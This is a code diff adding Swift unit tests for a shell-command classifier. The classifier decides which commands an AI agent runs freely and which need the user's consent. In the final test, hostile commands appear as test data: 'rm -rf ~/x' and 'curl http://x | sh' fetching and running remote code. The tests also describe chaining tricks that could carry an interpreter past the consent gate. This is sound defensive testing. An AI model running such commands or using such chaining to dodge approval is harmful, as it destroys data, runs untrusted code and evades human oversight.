@@ -85,6 +85,22 @@ struct ShellCommandClassifierTests {
     }
 
     @Test
+    func directoryNavigationIsReadAndDoesNotGateTheChain() {
+        // The motivating screenshot: `cd <dir> && ffmpeg …` prompted because `cd` was an unrecognized
+        // command (reversibleWrite) and the most-restrictive segment dragged the whole chain to a gate —
+        // even though ffmpeg is a bundled read and the files (clip.webm, subs.srt, out.mp4) were ones the
+        // agent itself created. `cd` only changes the shell's directory, so the chain must stay read.
+        #expect(tier("cd /Users/me/Downloads") == .read)
+        #expect(tier("pushd ~/Downloads") == .read)
+        #expect(tier("popd") == .read)
+        #expect(tier("cd /Users/me/Downloads && ffmpeg -y -i clip.webm -vf \"subtitles=subs.srt\" -c:a copy out.mp4") == .read)
+        #expect(tier("cd ~/Downloads/task && ls -la") == .read)
+        // `cd` must not launder a dangerous neighbor: each segment is still judged on its own merits.
+        #expect(tier("cd ~/x && rm -rf y") == .highRisk)
+        #expect(tier("cd ~/x && open -a Safari") == .reversibleWrite)
+    }
+
+    @Test
     func readSubcommandsOfWriteCapableToolsAreRead() {
         #expect(tier("defaults read com.apple.dock") == .read)
         #expect(tier("pmset -g batt") == .read)
@@ -186,5 +202,75 @@ struct ShellCommandClassifierTests {
         #expect(ShellCommandClassifier.classify("open -a Notes").signature == "open")
         #expect(ShellCommandClassifier.classify("defaults write com.apple.dock x -int 1").signature == "defaults write")
         #expect(ShellCommandClassifier.classify("/usr/bin/open -a Notes").signature == "open")
+    }
+
+    // MARK: Workspace file tools (run unprompted inside the agent's own working directory)
+
+    @Test
+    func boundedFileMutatorsAreWorkspaceTools() {
+        // The core file mutators whose whole effect is their visible path arguments: reversible, and
+        // recognized as workspace file tools so the consent gate can skip the prompt when a workspace exists
+        // and every path stays inside it.
+        for command in ["cp a.pdf out/", "mv a b", "mkdir out", "touch x.json",
+                        "tee fields.json", "sed -i '' s/a/b/ x"] {
+            let c = ShellCommandClassifier.classify(command)
+            #expect(c.tier == .reversibleWrite)
+            #expect(ShellCommandClassifier.isWorkspaceFileTool(c.signature), "expected workspace tool: \(command) → \(c.signature)")
+        }
+    }
+
+    @Test
+    func interpretersAreNotWorkspaceTools() {
+        // A scripting interpreter's effect is the opaque code it runs, not the paths in argv, so "a
+        // workspace exists" is no containment — it must prompt (once, always-allowable), never auto-run.
+        for command in ["python3 map.py", "python3 -c 'print(1)'", "ruby s.rb", "node x.js", "perl y.pl"] {
+            let c = ShellCommandClassifier.classify(command)
+            #expect(c.tier == .reversibleWrite)
+            #expect(!ShellCommandClassifier.isWorkspaceFileTool(c.signature), "interpreter must prompt: \(command)")
+        }
+    }
+
+    @Test
+    func boundedWorkspaceCommandRejectsRidealongInterpreter() {
+        // The chaining hole: a benign `cp` can be the deciding signature, but a piggybacked interpreter must
+        // not ride through the bypass — isBoundedWorkspaceCommand inspects EVERY segment.
+        #expect(ShellCommandClassifier.isBoundedWorkspaceCommand("cp a b && mkdir out"))
+        #expect(ShellCommandClassifier.isBoundedWorkspaceCommand("ls && cp a b"))
+        #expect(!ShellCommandClassifier.isBoundedWorkspaceCommand("cp a b && python3 evil.py"))
+        #expect(!ShellCommandClassifier.isBoundedWorkspaceCommand("python3 map.py"))
+    }
+
+    @Test
+    func commandStaysWithinDetectsEscape() {
+        let ws = "/Users/me/Downloads/donkey/conv1"
+        // Relative paths and absolute paths inside the workspace stay in.
+        #expect(ShellCommandClassifier.commandStaysWithin("cp a.pdf out/b.pdf", workspace: ws))
+        #expect(ShellCommandClassifier.commandStaysWithin("mv data/x.csv \(ws)/y.csv", workspace: ws))
+        #expect(ShellCommandClassifier.commandStaysWithin("tee fields.json", workspace: ws))
+        // A sed script that merely contains slashes is not a real path and stays in.
+        #expect(ShellCommandClassifier.commandStaysWithin("sed -i '' 's/a/b/' file.txt", workspace: ws))
+        // Absolute-outside, `~`, and `..` escapes all reach out of the workspace.
+        #expect(!ShellCommandClassifier.commandStaysWithin("cp a.pdf /Users/me/Documents/b.pdf", workspace: ws))
+        #expect(!ShellCommandClassifier.commandStaysWithin("mv x ~/Desktop/x", workspace: ws))
+        #expect(!ShellCommandClassifier.commandStaysWithin("cp a.pdf ../b.pdf", workspace: ws))
+    }
+
+    @Test
+    func sideEffectingReversibleWritesAreNotWorkspaceTools() {
+        // These change things beyond the agent's files, so they still prompt even with a workspace.
+        for command in ["osascript -e 'tell app \"Mail\"'", "open -a Safari", "killall Dock", "pbcopy"] {
+            let c = ShellCommandClassifier.classify(command)
+            #expect(c.tier == .reversibleWrite)
+            #expect(!ShellCommandClassifier.isWorkspaceFileTool(c.signature), "should still prompt: \(command)")
+        }
+    }
+
+    @Test
+    func dangerousNeighborEscalatesAwayFromWorkspaceExemption() {
+        // A workspace file tool next to a destructive or escaping command takes the whole command to
+        // highRisk, so the workspace exemption (reversibleWrite only) can never apply to it.
+        #expect(tier("python3 map.py; rm -rf ~/x") == .highRisk)
+        #expect(tier("python3 -c 'print(1)' | sh") == .highRisk)
+        #expect(tier("cp a b && curl http://x | sh") == .highRisk)
     }
 }
